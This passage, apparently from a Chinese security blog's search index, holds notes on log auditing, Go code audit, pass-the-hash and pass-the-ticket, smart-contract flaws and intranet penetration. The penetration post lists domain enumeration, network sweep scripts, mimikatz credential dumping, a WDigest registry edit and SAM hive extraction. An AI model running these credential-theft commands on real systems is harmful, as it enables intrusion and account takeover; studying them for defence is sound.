及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/log/secure存放用户日志信息，当然不一定叫secure日志</span><br><span class=\"line\">如果找不到查看/etc/rsyslog.d/50-default.conf</span><br><span class=\"line\">auth,authpriv.*记载其位置</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"日志审计常用命令\"><a href=\"#日志审计常用命令\" class=\"headerlink\" title=\"日志审计常用命令\"></a>日志审计常用命令</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一次错误密码错误的登录日志</span><br><span class=\"line\">Dec  3 21:57:01 iZ2ze38tf0alwmwm0agl1yZ sshd[14631]: Failed password for root from 11</span><br><span class=\"line\">3.119.*.* port 1075 ssh2</span><br><span class=\"line\">输出爆破者ip、时间等</span><br><span class=\"line\">grep &quot;Failed password&quot; /var/log/auth.log | awk &apos;&#123;print $1 &quot; &quot; $2 &quot; &quot; $3 &quot; &quot; $11&#125;&apos; | sort | more</span><br><span class=\"line\">登录成功ip</span><br><span class=\"line\">grep &quot;Accepted &quot; /var/log/secure | awk &apos;&#123;print $1,$2,$3,$9,$11&#125;&apos;</span><br><span class=\"line\">这样就能检索出通过弱口令的攻击</span><br><span class=\"line\">find /etc -name init寻找文件init</span><br></pre></td></tr></table></figure>\n\n","categories":[],"tags":[]},{"title":"区块链之公链审计","url":"http://yoursite.com/2019/11/21/区块链之公链审计/","content":"","categories":[],"tags":[]},{"title":"go白盒学习笔记","url":"http://yoursite.com/2019/11/08/go白盒学习笔记/","content":"<h1 id=\"go白盒学习笔记\"><a href=\"#go白盒学习笔记\" class=\"headerlink\" title=\"go白盒学习笔记\"></a>go白盒学习笔记</h1><p>这里对go的常见的可能引起安全问题的位置进行研究，列出白盒审计中需要注意的点。</p>\n<h2 id=\"go语言语法特征\"><a href=\"#go语言语法特征\" class=\"headerlink\" title=\"go语言语法特征\"></a>go语言语法特征</h2><p>个人觉得go和c十分相似(文艺复兴。。。)，go语言简洁优雅，是十分优秀的一门语言。</p>\n<p>这里讲一些go语法上的特殊点。</p>\n<h3 id=\"变量声明\"><a href=\"#变量声明\" class=\"headerlink\" title=\"变量声明\"></a>变量声明</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var 变量名 类型</span><br><span class=\"line\">var test int //声明int型变量</span><br><span class=\"line\">也可以var a = &quot;aaa&quot; //必须初始化，var a会报错</span><br><span class=\"line\">i := 1 //也可以如此声明变量</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"for\"><a href=\"#for\" class=\"headerlink\" title=\"for\"></a>for</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for a=0; a&lt;10; a++ &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">for a&lt;10&#123;//和while一样</span><br><span class=\"line\">\ta++</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">for key, value := range oldMap &#123;//迭代器</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var balance [10] float32</span><br><span class=\"line\">var 数组名 map[键类型]值类型//var test map[string]string</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"struct\"><a href=\"#struct\" class=\"headerlink\" title=\"struct\"></a>struct</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">和其他语言不一样的是go是没有class的，所以他的面向对象特性由struct来实现。</span><br><span class=\"line\">声明：</span><br><span class=\"line\">type Person struct &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">声明结构体的函数</span><br><span class=\"line\">func (person *Person) setAge(age int) &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">封装</span><br><span class=\"line\">首字母小写：private</span><br><span class=\"line\">首字母大写：public</span><br><span class=\"line\">public和private主要是针对不同的package来说的。</span><br><span class=\"line\"></span><br><span class=\"line\">继承</span><br><span class=\"line\">type Student struct &#123;</span><br><span class=\"line\">  Person person</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">多态</span><br><span class=\"line\">go使用接口实现多态性</span><br><span class=\"line\">type person interface &#123;</span><br><span class=\"line\">\ttest()</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">type student struct &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">func (student xiaoming) test() &#123;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go的异常处理也很奇怪，不是常见的try</span><br><span class=\"line\">正常情况发生异常是发生panic，程序退出.</span><br><span class=\"line\">可以自定义error处理机制</span><br><span class=\"line\">func Foo(param int) (n int,err error)&#123;</span><br><span class=\"line\">    //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">defer当声明他的函数返回时才执行（包含它的函数 执行了return语句/运行到函数结尾自动返回/对应的goroutine panic）执行</span><br><span class=\"line\">recover接受错误消息</span><br><span class=\"line\">组合起来可以当作try来使用</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"参数获取机制\"><a href=\"#参数获取机制\" class=\"headerlink\" title=\"参数获取机制\"></a>参数获取机制</h3><p>POST方法获取参数时是会获取请求中所有该参数的值</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573461963781.png\" alt=\"1573461963781\"></p>\n<p>GET方法获取参数时只会获取GET参数的值</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573462077405.png\" alt=\"1573462077405\"></p>\n<p>可以通过r.Form.Get(“url_long”)的方式获取第一个值,使用r.Form[“username”][0]的方式会导致服务器报错。</p>\n<h2 id=\"go白盒审计\"><a href=\"#go白盒审计\" class=\"headerlink\" title=\"go白盒审计\"></a>go白盒审计</h2><p>未找到系统的白盒审计教程，只有根据php之类的语言白盒教程来自己研究。</p>\n<h2 id=\"危险函数\"><a href=\"#危险函数\" class=\"headerlink\" title=\"危险函数\"></a>危险函数</h2><h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><p>import os/exec模块执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exec.Command(&quot;ls&quot;, &quot;-l&quot;)</span><br><span class=\"line\">cmd.Run()//run会等待命令执行完成</span><br><span class=\"line\">cmd.Start()//不会等待执行完成</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"文件读取、下载、删除\"><a href=\"#文件读取、下载、删除\" class=\"headerlink\" title=\"文件读取、下载、删除\"></a>文件读取、下载、删除</h3><p>go可以使用内置的os模块读取文件,在代码审计中对外部传入的变量filename应该进行过滤../防止任意文件读取、下载、删除</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">os.OpenFile(filename string, flag int, perm FileMode) (file *File, err error)</span><br><span class=\"line\">os.Open(filename *File, err error)</span><br><span class=\"line\">os.remove()</span><br><span class=\"line\">os.RemoveAll()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573964734466.png\" alt=\"1573964734466\"></p>\n<h2 id=\"危险库\"><a href=\"#危险库\" class=\"headerlink\" title=\"危险库\"></a>危险库</h2><p>因为go需要调用一些非官方的第三方库，而这些第三方库会存在危害</p>\n<h3 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h3><p>CVE-2018-6574由于go调用了名为cgo的工具，cgo会识别和读取Go源文件中的C元素，并将其提取后交给C编译器编译，最后与Go源码编译后的目标文件链接成一个可执行程序。</p>\n<p>由于有时候会使用外部代码，可能由于调用恶意外部代码导致代码执行</p>\n<h2 id=\"风险写法\"><a href=\"#风险写法\" class=\"headerlink\" title=\"风险写法\"></a>风险写法</h2><h3 id=\"整数溢出\"><a href=\"#整数溢出\" class=\"headerlink\" title=\"整数溢出\"></a>整数溢出</h3><p>由于go的数值大小有范围若是不检测溢出就可能发生一些意外的事</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573566161368.png\" alt=\"1573566161368\"></p>\n<h3 id=\"数组越界\"><a href=\"#数组越界\" class=\"headerlink\" title=\"数组越界\"></a>数组越界</h3><p>go只对a[10]之类的形式越界检查不对a[s]进行越界检查，如果s过大数组越界可能直接导致程序崩溃。</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573566856666.png\" alt=\"1573566856666\"></p>\n<h3 id=\"空指针使用\"><a href=\"#空指针使用\" class=\"headerlink\" title=\"空指针使用\"></a>空指针使用</h3><p>调用指针时加上空指针检测，否则调用空指针将导致服务崩溃。</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573570109467.png\" alt=\"1573570109467\"></p>\n<h3 id=\"函数返回值忽略\"><a href=\"#函数返回值忽略\" class=\"headerlink\" title=\"函数返回值忽略\"></a>函数返回值忽略</h3><p>go中有很多函数是具有两个返回值的func()(int,error)，会根据不同的情况返回不同的结果，如果没有对error返回判断可能会发生访问控制绕过等。</p>\n<h3 id=\"错误的随机数\"><a href=\"#错误的随机数\" class=\"headerlink\" title=\"错误的随机数\"></a>错误的随机数</h3><p>golang的math/rand模块生成的随机数是可以预测的，他是根据种子来生成的。下图同样的种子将会生成同样的随机数</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573615725461.png\" alt=\"1573615725461\"></p>\n<p>可以使用cryto/rand来生成随机数，rand.Seed()使用一个不可预测的变量作为随机数。</p>\n<h3 id=\"使用defer处理必须执行的模块\"><a href=\"#使用defer处理必须执行的模块\" class=\"headerlink\" title=\"使用defer处理必须执行的模块\"></a>使用defer处理必须执行的模块</h3><p>golang中defer是在函数运行中后无论什么情况在函数结束时必定会执行的模块，所以我们可以将file.close()之类的操作使用defer来执行防止发生意外。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">例子总结:</span><br><span class=\"line\">文件操作file.close()</span><br><span class=\"line\">数据库操作sql.close()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"常见漏洞防御方法\"><a href=\"#常见漏洞防御方法\" class=\"headerlink\" title=\"常见漏洞防御方法\"></a>常见漏洞防御方法</h2><h3 id=\"xss漏洞防御\"><a href=\"#xss漏洞防御\" class=\"headerlink\" title=\"xss漏洞防御\"></a>xss漏洞防御</h3><p>使用html.EscapeString等函数来转义</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1573480752093.png\" alt=\"1573480752093\"></p>\n<h3 id=\"SQL注入漏洞防御\"><a href=\"#SQL注入漏洞防御\" class=\"headerlink\" title=\"SQL注入漏洞防御\"></a>SQL注入漏洞防御</h3><p>golang拥有很方便的预编译处理机制，使用预编译便能预防注入。</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1574522695921.png\" alt=\"1574522695921\"></p>\n<p>如下如果使用拼接语句进行查询就会发生SQL注入漏洞。</p>\n<p><img src=\"/2019/11/08/go白盒学习笔记/1574522784416.png\" alt=\"1574522784416\"></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3>","categories":[],"tags":[]},{"title":"内网渗透PTH+PTT","url":"http://yoursite.com/2019/11/06/内网渗透PTH-PTT-PTK/","content":"<p>这两种攻击手法都是收集到足够的信息不使用密码便能构造认证。</p>\n<h2 id=\"PTH\"><a href=\"#PTH\" class=\"headerlink\" title=\"PTH\"></a>PTH</h2><p>说到PTH就先说NTLM。</p>\n<p>早期SMB协议在网络上传递是明文的username和password，后来出现了简称为LM的局域网管理挑战应答机制（LAN Manager Challenge/Response），后来微软又开发了WinNT LAN Manager Challenge/Response，简称NTLM。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">简单认证过程：</span><br><span class=\"line\">客户端发起认证请求</span><br><span class=\"line\">服务端收到认证请求，向客户端发送随机数（chanlleng/挑战）</span><br><span class=\"line\">客户端使用NTLM Hash打乱该随机数，生成Net-NTLM Hash，发送回服务端 （这里会造成pth攻击）</span><br></pre></td></tr></table></figure>\n\n<p>说白了就是hash当作密码的作用，我们不需要费劲心机的先碰撞出明文密码。</p>\n<h2 id=\"PTT\"><a href=\"#PTT\" class=\"headerlink\" title=\"PTT\"></a>PTT</h2><p>PTT是基于Kerberos协议的攻击</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Kerberos过程</span><br><span class=\"line\">身份认证</span><br><span class=\"line\">客户端使用hash加密时间戳给AS身份认证服务</span><br><span class=\"line\">AS接收到客户端发来的请求包后，会使用客户端的hash解密出timestamp，times&lt;5min</span><br><span class=\"line\">KDC会生成一个使用user1的hash加密的logon session key和krbtgt的hash加密的TGT</span><br><span class=\"line\"></span><br><span class=\"line\">获取权限</span><br><span class=\"line\">客户端向TGS发送TGT与logon session key加密的认证信息</span><br><span class=\"line\">使用krbtgt的hash解密TGT得到logon session key再解密认证信息</span><br><span class=\"line\">logon session key加密session key，和server hash加密的session key</span><br><span class=\"line\"></span><br><span class=\"line\">交互</span><br><span class=\"line\">客户端获得logon session key加密的session key后解密，再将server hash加密的session key发给服务器</span><br><span class=\"line\">双方使用session key通信</span><br></pre></td></tr></table></figure>\n\n<p>黄金票据就是获得krbtgt的HASH冒充任何人，白银票据就是获得服务器HASH再将server hash加密的任意session key给服务器。</p>\n","categories":[],"tags":[]},{"title":"内网渗透基础篇","url":"http://yoursite.com/2019/10/28/内网渗透基础篇/","content":"<h1 id=\"内网渗透\"><a href=\"#内网渗透\" class=\"headerlink\" title=\"内网渗透\"></a>内网渗透</h1><h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><h3 id=\"自身信息收集\"><a href=\"#自身信息收集\" class=\"headerlink\" title=\"自身信息收集\"></a>自身信息收集</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ipconfig /all                ------ 查询本机IP段，所在域等</span><br><span class=\"line\">net user                     ------ 本机用户列表</span><br><span class=\"line\">net localgroup administrators            ------ 本机管理员[通常含有域用户]</span><br><span class=\"line\">net user /domain                         ------ 查询域用户</span><br><span class=\"line\">net ``group` `/domain                        ------ 查询域里面的工作组</span><br><span class=\"line\">net ``group` `&quot;domain admins&quot;` `/domain        ------ 查询域管理员用户组</span><br><span class=\"line\">net localgroup administrators /domain    ------ 登录本机的域管理员</span><br><span class=\"line\">net localgroup administrators workgroup\\user001 /add   ------域用户添加到本机</span><br><span class=\"line\">net ``group` `&quot;domain controllers&quot;` `/domain        ------ 查看域控制器(如果有多台)</span><br><span class=\"line\">net time /domain                   ------ 判断主域，主域服务器都做时间服务器</span><br><span class=\"line\">net config workstation             ------ 当前登录域</span><br><span class=\"line\">net session                        ------ 查看当前会话</span><br><span class=\"line\">net use \\\\ip\\ipc$ pawword /user:username      ------ 建立IPC会话[空连接-***]</span><br><span class=\"line\">net share                          ------  查看SMB指向的路径[即共享]</span><br><span class=\"line\">net view                           ------ 查询同一域内机器列表</span><br><span class=\"line\">net view \\\\ip                      ------ 查询某IP共享</span><br><span class=\"line\">net view /domain                   ------ 查询域列表</span><br><span class=\"line\">net view /domain:domainname        ------ 查看workgroup域中计算机列表</span><br><span class=\"line\">net start                          ------ 查看当前运行的服务</span><br><span class=\"line\">net accounts                       ------  查看本地密码策略</span><br><span class=\"line\">net accounts /domain               ------  查看域密码策略</span><br><span class=\"line\">nbtstat –A ip                      ------netbios 查询</span><br><span class=\"line\">netstat –an/ano/anb                ------ 网络连接查询</span><br><span class=\"line\">route print                        ------ 路由表tasklist /V                        ----- 查看进程[显示对应用户]</span><br><span class=\"line\">tasklist /S ip /U domain\\username /P /V             ----- 查看远程计算机进程列表</span><br><span class=\"line\">qprocess *                         ----- 类似tasklist</span><br><span class=\"line\">qprocess /SERVER:IP                ----- 远程查看计算机进程列表</span><br><span class=\"line\">nslookup –qt-MX Yahoo.com          ----- 查看邮件服务器</span><br><span class=\"line\">whoami /all                        ----- 查询当前用户权限等</span><br><span class=\"line\">set`                                `----- 查看系统环境变量</span><br><span class=\"line\">systeminfo                         ----- 查看系统信息</span><br><span class=\"line\">qwinsta                            ----- 查看登录情况</span><br><span class=\"line\">qwinsta /SERVER:IP                 ----- 查看远程登录情况</span><br><span class=\"line\">fsutil fsinfo drives               ----- 查看所有盘符</span><br><span class=\"line\">gpupdate /force                    ----- 更新域策略</span><br><span class=\"line\">cmdkey /l                          ----- 看是否保存了登陆凭证。（攻击者会先查看管理员是否保留了登陆凭证，方便后续的凭证抓取。）  </span><br><span class=\"line\">echo %logonserver%                 ----- 查看登陆域</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"内网环境探测\"><a href=\"#内网环境探测\" class=\"headerlink\" title=\"内网环境探测\"></a>内网环境探测</h3><p>可能防火墙禁止icmp可以通过arp等协议扫描，通过各种手段了解主机所在内网环境情况。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows:内网IP探测</span><br><span class=\"line\">icmp:powershell.exe -exec bypass -Command &quot;Import-Module C:\\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000&quot;</span><br><span class=\"line\">arp:powershell.exe -exec bypass -Command &quot;Import-Module C:\\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;  &gt;&gt; result.txt</span><br><span class=\"line\">linux:内网ip探测</span><br><span class=\"line\">for i in 192.168.0.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"抓取主机密码\"><a href=\"#抓取主机密码\" class=\"headerlink\" title=\"抓取主机密码\"></a>抓取主机密码</h3><p>主要使用工具抓取主机密码mimikatz，pwdump7，Invoke-PowerDump.ps1</p>\n<p>注：都需要管理员权限。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">抓取密码</span><br><span class=\"line\">powershell -ep bypass -f Invoke-PowerDump.ps1</span><br><span class=\"line\"></span><br><span class=\"line\">在windows10/2012r2 之后的系统版本中，默认情况下是禁用了在内存缓存中存储系统用户明文密码，此时使用mimikatz去抓取密码，会显示null。</span><br><span class=\"line\">方法：修改注册表，修改后管理员一旦在输入密码就能在内存中抓取明文</span><br><span class=\"line\">reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class=\"line\"></span><br><span class=\"line\">nbtscan</span><br><span class=\"line\">nbtscan.exe -m  192.168.0.1/24</span><br><span class=\"line\"></span><br><span class=\"line\">reg提取主机密码</span><br><span class=\"line\">reg save HKLM\\SYSTEM system.hiv</span><br><span class=\"line\">reg save HKLM\\SAM sam.hiv</span><br><span class=\"line\">reg save HKLM\\SECURITY sercrity.hiv</span><br><span class=\"line\">mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv /sercrity:sercrity.hiv&quot; exit</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击思路及漏洞\"><a href=\"#攻击思路及漏洞\" class=\"headerlink\" title=\"攻击思路及漏洞\"></a>攻击思路及漏洞</h2><h3 id=\"window2008GPP漏洞\"><a href=\"#window2008GPP漏洞\" class=\"headerlink\" title=\"window2008GPP漏洞\"></a>window2008GPP漏洞</h3><p>为了方便密码更新windows2008使用了组策略，然后生成的密码文件对所有人可读且公钥公开导致可以通过读取组策略文件找到明文密码。补丁KB2962486</p>\n<h3 id=\"相同密码登陆（hash碰撞）\"><a href=\"#相同密码登陆（hash碰撞）\" class=\"headerlink\" title=\"相同密码登陆（hash碰撞）\"></a>相同密码登陆（hash碰撞）</h3><p>利用喜欢使用相同密码的特性，不断获取内网中的密码从而找到管理员密码。</p>\n<p>1.获得一台域主机权限；<br>2.Dump内存获取用户hash（或明文）；<br>3.通过密码尝试登陆其他主机；<br>4.继续收集hash或明文，并尝试远程登陆；<br>5.知道获得域管理员hash或密码，登陆域控，最终成功控制整个域。</p>\n","categories":[],"tags":[]},{"title":"区块链之智能合约","url":"http://yoursite.com/2019/10/21/区块链之智能合约/","content":"<h1 id=\"区块链之智能合约\"><a href=\"#区块链之智能合约\" class=\"headerlink\" title=\"区块链之智能合约\"></a>区块链之智能合约</h1><h2 id=\"solidity代码特点\"><a href=\"#solidity代码特点\" class=\"headerlink\" title=\"solidity代码特点\"></a>solidity代码特点</h2><h2 id=\"漏洞风险\"><a href=\"#漏洞风险\" class=\"headerlink\" title=\"漏洞风险\"></a>漏洞风险</h2><h3 id=\"重入攻击\"><a href=\"#重入攻击\" class=\"headerlink\" title=\"重入攻击\"></a>重入攻击</h3><p>重入攻击是由于call.value()可以消耗所有的gas和回退函数之间的配合引起的，如果受害者合约使用call.value()来发送货币到攻击者合约，合约接收到ether时会使用回退函数，这时回退函数再调用攻击者合约的发送ether的模块，如果更新余额等操作发生在发送ether之前那么代码就将会在发送ether和回退函数之间迭代运行，这样合约账户的钱就会被全部转走。</p>\n<p><strong>预防</strong></p>\n<p>1.使用Call.value()先修改后转账，但失败不会自动回滚，需要手动处理。</p>\n<p>2.使用send ,transfer 转账时只有2300个gas，不足以支撑第二次交易，send一样失败不会回滚。</p>\n<h3 id=\"数值溢出检测\"><a href=\"#数值溢出检测\" class=\"headerlink\" title=\"数值溢出检测\"></a>数值溢出检测</h3><p>智能合约中的算数问题是指整数溢出和整数下溢。Solidity最多能处理256位的数字，超过会出现异常问题。</p>\n<p><strong>预防</strong></p>\n<p>1.使用SafeMath库</p>\n<h3 id=\"访问控制检测\"><a href=\"#访问控制检测\" class=\"headerlink\" title=\"访问控制检测\"></a>访问控制检测</h3><p>访问控制缺陷是所有程序中都可能存在的安全风险，智能合约也同样会存在类似问题，著名的Parity Wallet智能合约就受到过该问题的影响。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑</p>\n<h3 id=\"返回值调用验证\"><a href=\"#返回值调用验证\" class=\"headerlink\" title=\"返回值调用验证\"></a>返回值调用验证</h3><p>send和call.value失败返回为false，transfer失败抛出异常，如果不检测返回值继续执行代码可能出现问题。</p>\n<p><strong>预防</strong></p>\n<p>1.使用require抛出异常或者if处理失败send和call.value失败</p>\n<h3 id=\"错误使用随机数\"><a href=\"#错误使用随机数\" class=\"headerlink\" title=\"错误使用随机数\"></a>错误使用随机数</h3><p>区块链由于不存在真正的随机数，所以使用过去、现在、未来某个量作为随机数是可能存在问题的，区块链的随机数最好来自外部。</p>\n<p><strong>预防</strong></p>\n<p>1.使用不可预测的数字作为随机源</p>\n<h3 id=\"事务顺序依赖\"><a href=\"#事务顺序依赖\" class=\"headerlink\" title=\"事务顺序依赖\"></a>事务顺序依赖</h3><p>由于区块链的透明性，当一个用户做出一个请求如回答问题的到赏金，攻击者可以发送更高的gas以更早执行从而获取赏金等。</p>\n<p><strong>预防</strong></p>\n<p>1.通过代码逻辑防止该类攻击，比如说先提交MD5码，等处理完后再提交答案，以MD5码的时间为准等。</p>\n<h3 id=\"拒绝服务攻击\"><a href=\"#拒绝服务攻击\" class=\"headerlink\" title=\"拒绝服务攻击\"></a>拒绝服务攻击</h3><p>通过攻击手段导致程序不能执行。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑</p>\n<h3 id=\"逻辑设计缺陷\"><a href=\"#逻辑设计缺陷\" class=\"headerlink\" title=\"逻辑设计缺陷\"></a>逻辑设计缺陷</h3><p>合约设计逻辑存在漏洞</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑</p>\n<h3 id=\"假充值漏洞\"><a href=\"#假充值漏洞\" class=\"headerlink\" title=\"假充值漏洞\"></a>假充值漏洞</h3><p>如充值处程序设计错误，仅判断是否余额足够但却继续执行了充值代码。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测程序逻辑，使用require来处理程序。</p>\n<h3 id=\"增发代币漏洞\"><a href=\"#增发代币漏洞\" class=\"headerlink\" title=\"增发代币漏洞\"></a>增发代币漏洞</h3><p>检测在初始化代币总量后，代币合约中存在可能使代币总量增加的函数。</p>\n<p><strong>预防</strong></p>\n<p>1.人工检测是否存在非正常的可增加代币。</p>\n","categories":[],"tags":[]},{"title":"提权","url":"http://yoursite.com/2019/10/15/提权/","content":"<h1 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h1><h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" 